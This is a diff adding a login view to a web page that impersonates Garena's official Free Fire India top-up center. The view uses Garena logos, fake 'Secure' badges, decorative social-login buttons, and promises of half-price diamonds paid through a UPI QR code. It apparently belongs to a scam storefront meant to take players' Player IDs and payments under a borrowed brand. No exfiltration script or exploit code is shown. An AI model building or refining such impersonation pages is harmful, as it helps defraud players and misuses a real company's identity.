@@ -1,4 +1,4 @@
-<!DOCTYPE html>
+﻿<!DOCTYPE html>
 <html lang="en">
 <head>
   <!-- Zero-Flicker Anti-Flash Initializer -->
@@ -466,6 +466,175 @@
   <!-- Background texture (shared) -->
   <div class="fixed inset-0 -z-10 w-full h-full bg-cover bg-center bg-no-repeat opacity-[0.05]" style="background-image:url('background.jpg');"></div>
   <div class="fixed inset-0 -z-10 w-full h-full bg-gradient-to-b from-white/90 via-slate-50/95 to-slate-100"></div>
+
+    <div id="view-login" class="spa-view flex flex-col min-h-screen">
+
+    <!-- Header -->
+    <nav class="sticky top-0 z-50 backdrop-blur-md border-b shadow-sm" >
+      <div class="max-w-md mx-auto px-4 py-3 flex items-center justify-between">
+        <div class="flex items-center gap-3 select-none">
+          <img src="garena_logo.png" alt="Garena" class="h-8 w-auto object-contain" fetchpriority="high" />
+          <div class="leading-tight border-l border-slate-200 pl-3">
+            <span class="block text-sm font-black tracking-widest text-[#ff1f3b]">GARENA</span>
+            <span class="block text-[10px] font-bold text-slate-500 uppercase tracking-wider">Official Top Up Center</span>
+          </div>
+        </div>
+        <div class="flex items-center gap-2">
+          <div class="flex items-center gap-1.5 text-emerald-600 text-xs font-semibold bg-emerald-50 border border-emerald-200 px-2.5 py-1 rounded-full">
+            <span class="w-1.5 h-1.5 rounded-full bg-emerald-500 animate-pulse"></span>
+            <span>Secure</span>
+          </div>
+        </div>
+      </div>
+    </nav>
+
+    <!-- Full-width edge-to-edge ad banner -->
+    <div class="w-full overflow-hidden relative bg-slate-200" style="aspect-ratio:900/340;" id="adSlider">
+      <div class="ad-slide active" id="slide-0">
+        <img src="ad_banner1.jpg" alt="Diamonds at a Discount"
+             class="w-full h-full object-fill block" fetchpriority="high" draggable="false" />
+      </div>
+      <div class="ad-slide" id="slide-1">
+        <img src="ad_banner2.png" alt="Brand New Official Top Up Center"
+             class="w-full h-full object-fill block" draggable="false" />
+      </div>
+    </div>
+
+    <!-- Main content -->
+    <main class="flex-1 max-w-md w-full mx-auto px-4 pt-4 pb-8 space-y-5">
+
+      <!-- Free Fire Hero Banner -->
+      <div class="relative w-full max-w-[420px] mx-auto rounded-md overflow-hidden shadow-sm border border-slate-200/80">
+        <img src="ff_hero_banner.jpg" alt="Free Fire India" class="w-full h-auto object-cover block" />
+        
+        <div class="absolute inset-x-0 bottom-0 bg-gradient-to-t from-black/75 via-black/35 to-transparent px-3 py-2.5 sm:px-4 sm:py-3 flex items-center justify-between gap-2">
+          <div class="flex items-center gap-2">
+            <img src="ff_india_logo.jpg" alt="Free Fire India" class="h-9 w-9 object-cover rounded-md shadow-sm" />
+            <div>
+              <p class="text-white font-black text-sm sm:text-base leading-tight tracking-wide drop-shadow-md">Free Fire India</p>
+              <p class="text-white text-[9px] sm:text-[10px] font-semibold tracking-wide uppercase leading-tight mt-0.5">Official Top-Up Center</p>
+            </div>
+          </div>
+          <div class="inline-flex items-center gap-1.5 flex-shrink-0 px-2 py-0.5 rounded-md border border-emerald-400/50 text-white text-[9px] font-bold"
+               style="background:linear-gradient(135deg,rgba(16,185,129,.85) 0%,rgba(5,150,105,.95) 100%);box-shadow:0 0 10px rgba(16,185,129,.35);">
+            <svg class="w-2.5 h-2.5" fill="currentColor" viewBox="0 0 24 24">
+              <path d="M18 8h-1V6A5 5 0 0 0 7 6v2H6a2 2 0 0 0-2 2v10a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V10a2 2 0 0 0-2-2Zm-6 9a2 2 0 1 1 0-4 2 2 0 0 1 0 4Zm3.1-9H8.9V6a3.1 3.1 0 1 1 6.2 0v2Z"/>
+            </svg>
+            <span>100% Secure</span>
+          </div>
+        </div>
+      </div>
+
+      <!-- Step 1 Player Login Card (Official Garena Shop Design) -->
+      <div class="login-container">
+        <header class="step-title">
+          <div class="step-number">1</div>
+          <h2>Login</h2>
+        </header>
+
+        <main class="login-card">
+          <label class="field-label" for="uidInput">
+            Player ID <span class="help" title="Enter your in-game Player ID">?</span>
+          </label>
+          <form id="loginForm" onsubmit="event.preventDefault(); initiateLogin();">
+            <div class="login-row">
+              <input id="uidInput" type="text" inputmode="numeric" autocomplete="off" maxlength="12"
+                placeholder="Please enter player ID here" aria-label="Player ID" oninput="hideUidError()">
+              <button type="submit" id="verifyBtn">Login</button>
+            </div>
+            <div id="uidErrorContainer" class="hidden">
+              <p class="message" id="uidErrorMessage" aria-live="polite"></p>
+            </div>
+          </form>
+
+          <div class="divider">Or login with your game account</div>
+
+          <div class="socials" aria-label="Game account sign-in options">
+            <!-- Facebook: recognizable white f mark -->
+            <button class="social blue" type="button" aria-label="Facebook" onclick="alert('Please enter your Player ID to top up directly.')">
+              <svg viewBox="0 0 24 24" aria-hidden="true">
+                <path fill="#fff" d="M13.45 21v-8.2h2.76l.41-3.2h-3.17V7.56c0-.93.26-1.56 1.59-1.56h1.7V3.14C16.45 3.05 15.42 3 14.22 3c-2.5 0-4.21 1.53-4.21 4.34V9.6H7.18v3.2h2.83V21h3.44z"/>
+              </svg>
+            </button>
+
+            <!-- Google: four-colour G -->
+            <button class="social" type="button" aria-label="Google" onclick="alert('Please enter your Player ID to top up directly.')">
+              <svg viewBox="0 0 48 48" aria-hidden="true">
+                <path fill="#4285F4" d="M43.6 24.5c0-1.4-.1-2.8-.4-4.1H24v7.8h11c-.5 2.5-1.9 4.6-4 6v5h6.5c3.8-3.5 6.1-8.6 6.1-14.7z"/>
+                <path fill="#34A853" d="M24 44c5.5 0 10.1-1.8 13.5-4.8l-6.5-5c-1.8 1.2-4.1 2-7 2-5.3 0-9.8-3.6-11.4-8.4H5.9v5.2C9.3 39.6 16.1 44 24 44z"/>
+                <path fill="#FBBC05" d="M12.6 27.8a12 12 0 0 1 0-7.6V15H5.9a20 20 0 0 0 0 18z"/>
+                <path fill="#EA4335" d="M24 11.8c3 0 5.7 1 7.8 3.1l5.8-5.8C34.1 5.8 29.5 4 24 4 16.1 4 9.3 8.4 5.9 15l6.7 5.2c1.6-4.8 6.1-8.4 11.4-8.4z"/>
+              </svg>
+            </button>
+
+            <!-- X: clean official-style X mark -->
+            <button class="social" type="button" aria-label="X" onclick="alert('Please enter your Player ID to top up directly.')">
+              <svg viewBox="0 0 24 24" aria-hidden="true">
+                <path fill="#000" d="M18.9 2H22l-6.77 7.74L23.2 22h-6.25l-4.9-7.41L5.57 22H2.43l7.24-8.28L1.9 2h6.41l4.43 6.75L18.9 2zm-1.1 18h1.73L7.36 3.9H5.5L17.8 20z"/>
+              </svg>
+            </button>
+
+            <!-- VK: VK brand glyph, custom inline vector -->
+            <button class="social blue" type="button" aria-label="VK" onclick="alert('Please enter your Player ID to top up directly.')">
+              <svg viewBox="0 0 24 24" aria-hidden="true">
+                <path fill="#fff" d="M3.2 7.35h3.12c.27 0 .46.12.56.4 1.12 2.86 2.33 4.48 3.02 4.48.34 0 .46-.28.46-1.55V8.55c-.06-1.05-.62-1.28-.62-1.66 0-.25.22-.42.55-.42h4.18c.37 0 .55.22.55.58v3.72c0 .43.14.58.36.58.3 0 .64-.26 1.27-1.08.95-1.23 1.66-2.9 1.98-3.67.12-.32.35-.46.72-.46h3.12c.49 0 .7.25.56.7-.25 1.15-2.88 5-2.88 5-.26.37-.31.6.02.97.22.26.9.92 1.35 1.48.84.98 1.47 1.8 1.67 2.38.18.58-.08.86-.7.86h-3.12c-.5 0-.77-.24-1.15-.78-.52-.72-1.28-1.8-2.04-2.45-.58-.49-.97-.62-1.28-.49-.3.13-.39.45-.39 1.14v1.62c0 .72-.22.96-1.46.96-2.12 0-4.48-1.3-6.27-3.55-2.5-3.1-4.17-6.9-4.17-7.49 0-.3.2-.48.58-.48z"/>
+              </svg>
+            </button>
+
+            <!-- Apple: accurately proportioned bitten-apple silhouette -->
+            <button class="social" type="button" aria-label="Apple" onclick="alert('Please enter your Player ID to top up directly.')">
+              <svg viewBox="0 0 24 28" aria-hidden="true">
+                <path fill="#000" d="M17.55 14.85c.03 3.15 2.76 4.2 2.79 4.22-.02.08-.43 1.49-1.43 2.95-.86 1.25-1.76 2.5-3.17 2.52-1.39.03-1.84-.82-3.43-.82s-2.09.79-3.4.85c-1.36.05-2.39-1.35-3.26-2.6C3.87 18.4 2.55 12.3 4.4 9.1c.92-1.6 2.56-2.61 4.34-2.64 1.35-.03 2.62.91 3.44.91.81 0 2.34-1.12 3.95-.96.67.03 2.56.27 3.77 2.04-.1.06-2.25 1.31-2.35 3.9zM14.96 4.7c.72-.87 1.2-2.08 1.07-3.29-1.04.04-2.3.69-3.04 1.56-.67.77-1.26 2-1.1 3.18 1.16.09 2.35-.59 3.07-1.45z"/>
+              </svg>
+            </button>
+          </div>
+        </main>
+      </div>
+
+      <!-- How It Works -->
+      <div class="glass-card rounded-2xl p-5 shadow-md border border-slate-200/60">
+        <h3 class="text-xs font-black tracking-widest text-garena-red uppercase mb-4 border-b border-slate-100 pb-2">How It Works</h3>
+        <div class="grid grid-cols-1 gap-4">
+          <div class="flex items-start gap-3.5">
+            <div class="flex-shrink-0 w-6 h-6 rounded-lg bg-[#FF6600]/10 border border-garena-red/20 text-garena-red flex items-center justify-center font-bold text-xs">1</div>
+            <div>
+              <h4 class="font-extrabold text-xs text-slate-700">Verify your Free Fire ID</h4>
+              <p class="text-[10px] text-garena-textGray mt-0.5 leading-relaxed">Enter your numeric ID to check compatibility and profile details.</p>
+            </div>
+          </div>
+          <div class="flex items-start gap-3.5 border-t border-slate-100 pt-3">
+            <div class="flex-shrink-0 w-6 h-6 rounded-lg bg-[#FF6600]/10 border border-garena-red/20 text-garena-red flex items-center justify-center font-bold text-xs">2</div>
+            <div>
+              <h4 class="font-extrabold text-xs text-slate-700">Choose your plan</h4>
+              <p class="text-[10px] text-garena-textGray mt-0.5 leading-relaxed">Select from half-price diamond packs, memberships, or redeem codes.</p>
+            </div>
+          </div>
+          <div class="flex items-start gap-3.5 border-t border-slate-100 pt-3">
+            <div class="flex-shrink-0 w-6 h-6 rounded-lg bg-[#FF6600]/10 border border-garena-red/20 text-garena-red flex items-center justify-center font-bold text-xs">3</div>
+            <div>
+              <h4 class="font-extrabold text-xs text-slate-700">Complete Payment</h4>
+              <p class="text-[10px] text-garena-textGray mt-0.5 leading-relaxed">Pay securely using any UPI app by scanning the generated dynamic QR code.</p>
+            </div>
+          </div>
+          <div class="flex items-start gap-3.5 border-t border-slate-100 pt-3">
+            <div class="flex-shrink-0 w-6 h-6 rounded-lg bg-[#FF6600]/10 border border-garena-red/20 text-garena-red flex items-center justify-center font-bold text-xs">4</div>
+            <div>
+              <h4 class="font-extrabold text-xs text-slate-700">Diamonds delivered instantly</h4>
+              <p class="text-[10px] text-garena-textGray mt-0.5 leading-relaxed">System pushes direct API credits to your mailbox in real-time.</p>
+            </div>
+          </div>
+        </div>
+      </div>
+    </main>
+
+    <footer class="bg-slate-50 border-t border-slate-200 py-6 text-center">
+      <p class="text-[10px] text-slate-500 px-4 leading-normal">
+        ┬⌐ 2026 Free Fire India Official Top Up. All rights reserved.<br/>
+        This is a secure billing gateway. Powered by Garena Direct API.
+      </p>
+    </footer>
+  </div><!-- /view-login -->
+
 
   <!-- ════════════════════════════════════════════════════════
        VIEW 2 – Confirmation Page (Pure White Background)
